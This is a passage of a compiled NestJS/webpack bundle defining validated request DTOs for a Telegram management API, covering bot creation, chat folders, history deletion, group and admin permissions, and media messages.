__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of what your bot can do',
        example: 'This bot helps you manage your tasks',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateTgBotDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'What the bot can be used for',
        example: 'Task Management, Reminders, Notes',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(512),
    __metadata("design:type", String)
], CreateTgBotDto.prototype, "aboutText", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL to the bot\'s profile photo',
        example: 'https://example.com/bot-photo.jpg',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateTgBotDto.prototype, "profilePhotoUrl", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-chat-folder.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/create-chat-folder.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChatFolderDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateChatFolderDto {
}
exports.CreateChatFolderDto = CreateChatFolderDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the chat folder' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateChatFolderDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to include in the folder' }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "includedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'List of chat IDs to exclude from the folder', required: false }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Array)
], CreateChatFolderDto.prototype, "excludedChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include non-contacts in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeNonContacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include groups in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeGroups", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include broadcast channels in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBroadcasts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Include bots in the folder', required: false, default: true }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "includeBots", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude muted chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeMuted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude read chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeRead", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude archived chats from the folder', required: false, default: false }),
    (0, class_validator_1.IsBoolean)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Boolean)
], CreateChatFolderDto.prototype, "excludeArchived", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/delete-chat.dto.ts":
/*!********************************************************!*\
  !*** ./src/components/Telegram/dto/delete-chat.dto.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DeleteHistoryDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class DeleteHistoryDto {
    constructor() {
        this.justClear = true;
        this.revoke = false;
    }
}
exports.DeleteHistoryDto = DeleteHistoryDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username or peer ID of the chat whose history you want to delete',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], DeleteHistoryDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Deletes all messages with IDs less than or equal to this value',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, clears the history only for the current user without deleting for others',
        default: true,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "justClear", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, deletes the message history for all participants (if permitted)',
        default: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "revoke", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "minDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxDate", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/group-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/group-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.createGroupDto = exports.ChatCleanupDto = exports.GroupSettingsDto = exports.AdminOperationDto = exports.GroupMemberOperationDto = exports.BaseGroupOperationDto = exports.AdminPermissionsDto = exports.AdminPermission = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var AdminPermission;
(function (AdminPermission) {
    AdminPermission["CHANGE_INFO"] = "changeInfo";
    AdminPermission["POST_MESSAGES"] = "postMessages";
    AdminPermission["EDIT_MESSAGES"] = "editMessages";
    AdminPermission["DELETE_MESSAGES"] = "deleteMessages";
    AdminPermission["BAN_USERS"] = "banUsers";
    AdminPermission["INVITE_USERS"] = "inviteUsers";
    AdminPermission["PIN_MESSAGES"] = "pinMessages";
    AdminPermission["ADD_ADMINS"] = "addAdmins";
    AdminPermission["ANONYMOUS"] = "anonymous";
    AdminPermission["MANAGE_CALL"] = "manageCall";
})(AdminPermission || (exports.AdminPermission = AdminPermission = {}));
class AdminPermissionsDto {
    constructor() {
        this.changeInfo = true;
        this.postMessages = true;
        this.editMessages = true;
        this.deleteMessages = true;
        this.banUsers = true;
        this.inviteUsers = true;
        this.pinMessages = true;
        this.addAdmins = false;
        this.anonymous = false;
        this.manageCall = true;
    }
}
exports.AdminPermissionsDto = AdminPermissionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to change group info', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "changeInfo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to post messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "postMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to edit messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "editMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to delete messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "deleteMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to ban users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "banUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to invite users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "inviteUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to pin messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "pinMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to add new admins', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "addAdmins", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to remain anonymous', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "anonymous", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to manage voice chats', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "manageCall", void 0);
class BaseGroupOperationDto {
}
exports.BaseGroupOperationDto = BaseGroupOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group ID' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], BaseGroupOperationDto.prototype, "groupId", void 0);
class GroupMemberOperationDto extends BaseGroupOperationDto {
}
exports.GroupMemberOperationDto = GroupMemberOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of user IDs', type: [String] }),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], GroupMemberOperationDto.prototype, "members", void 0);
class AdminOperationDto extends BaseGroupOperationDto {
}
exports.AdminOperationDto = AdminOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User ID to promote/demote' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "userId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to promote or demote', required: true }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminOperationDto.prototype, "isPromote", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Admin permissions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => AdminPermissionsDto),
    __metadata("design:type", AdminPermissionsDto)
], AdminOperationDto.prototype, "permissions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Custom admin rank/title', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "rank", void 0);
class GroupSettingsDto extends BaseGroupOperationDto {
    constructor() {
        super(...arguments);
        this.megagroup = true;
        this.forImport = false;
    }
}
exports.GroupSettingsDto = GroupSettingsDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group title', required: false }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group username', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], GroupSettingsDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], GroupSettingsDto.prototype, "memberRestrictions", void 0);
class ChatCleanupDto extends BaseGroupOperationDto {
}
exports.ChatCleanupDto = ChatCleanupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to clean up' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ChatCleanupDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delete messages before this date', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value) : undefined),
    __metadata("design:type", Date)
], ChatCleanupDto.prototype, "beforeDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Only delete media messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "onlyMedia", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude pinned messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "excludePinned", void 0);
class createGroupDto {
    constructor() {
        this.slowMode = 0;
        this.megagroup = true;
        this.broadcast = true;
        this.forImport = false;
    }
}
exports.createGroupDto = createGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group title', required: true }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "about", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], createGroupDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a broadcast', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], createGroupDto.prototype, "memberRestrictions", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/index.ts":
/*!**********************************************!*\
  !*** ./src/components/Telegram/dto/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AdminPermission = exports.MediaType = exports.BatchOperationType = void 0;
__exportStar(__webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts"), exports);
__exportStar(__webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./schedule-operations.dto */ "./src/components/Telegram/dto/schedule-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./metadata-operations.dto */ "./src/components/Telegram/dto/metadata-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./contact-management.dto */ "./src/components/Telegram/dto/contact-management.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./profile-settings.dto */ "./src/components/Telegram/dto/profile-settings.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./view-once-media.dto */ "./src/components/Telegram/dto/view-once-media.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./create-bot.dto */ "./src/components/Telegram/dto/create-bot.dto.ts"), exports);
var batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
Object.defineProperty(exports, "BatchOperationType", ({ enumerable: true, get: function () { return batch_operations_dto_1.BatchOperationType; } }));
var media_operations_dto_1 = __webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts");
Object.defineProperty(exports, "MediaType", ({ enumerable: true, get: function () { return media_operations_dto_1.MediaType; } }));
var group_operations_dto_1 = __webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts");
Object.defineProperty(exports, "AdminPermission", ({ enumerable: true, get: function () { return group_operations_dto_1.AdminPermission; } }));


/***/ }),

/***/ "./src/components/Telegram/dto/media-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/media-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.VoiceMessageDto = exports.SendMediaAlbumDto = exports.MediaAlbumItemDto = exports.SendMediaDto = exports.MediaFilterDto = exports.MediaSearchDto = exports.BaseMediaOperationDto = exports.MediaType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MediaType;
(function (MediaType) {
    MediaType["PHOTO"] = "photo";
    MediaType["VIDEO"] = "video";
    MediaType["DOCUMENT"] = "document";
    MediaType["VOICE"] = "voice";
    MediaType["AUDIO"] = "audio";
})(MediaType || (exports.MediaType = MediaType = {}));
class BaseMediaOperationDto {
}
exports.BaseMediaOperationDto = BaseMediaOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for media operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseMediaOperationDto.prototype, "chatId", void 0);
class MediaSearchDto extends BaseMediaOperationDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.MediaSearchDto = MediaSearchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Media types to include', enum: MediaType, isArray: true }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MediaType, { each: true }),
    __metadata("design:type", Array)
], MediaSearchDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items per page', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "limit", void 0);
class MediaFilterDto extends MediaSearchDto {
}
exports.MediaFilterDto = MediaFilterDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Start date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'End date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "endDate", void 0);
class SendMediaDto extends BaseMediaOperationDto {
}
exports.SendMediaDto = SendMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Filename for the media' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "filename", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], SendMediaDto.prototype, "type", void 0);
class MediaAlbumItemDto {
}
exports.MediaAlbumItemDto = MediaAlbumItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media item', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "caption", void 0);
class SendMediaAlbumDto extends BaseMediaOperationDto {
}
exports.SendMediaAlbumDto = SendMediaAlbumDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of media items', type: [MediaAlbumItemDto] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ValidateNested)({ each: true }),
    (0, class_transformer_1.Type)(() => MediaAlbumItemDto),
    __metadata("design:type", Array)
], SendMediaAlbumDto.prototype, "media", void 0);
class VoiceMessageDto extends BaseMediaOperationDto {
}
exports.VoiceMessageDto = VoiceMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the voice message file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Duration of voice message in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], VoiceMessageDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the voice message', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "caption", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/message-search.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/dto/message-search.dto.ts ***!
  \***********************************************************/
